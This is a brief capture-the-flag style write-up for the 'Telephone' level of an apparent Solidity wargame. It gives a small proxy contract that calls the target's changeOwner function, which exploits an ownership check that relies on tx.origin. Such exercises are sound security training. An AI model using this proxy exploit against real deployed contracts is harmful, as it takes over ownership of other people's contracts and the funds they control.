#Telephone

We can just take the contract from Coin Flip and use a proxy address to change the owner since
tx.origin only keeps track of EOA.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract proxy {
    constructor(){}

    function changeOwner(address _telephone, address _owner) public{
        ITelephone(_telephone).changeOwner(_owner);
    }
}
```
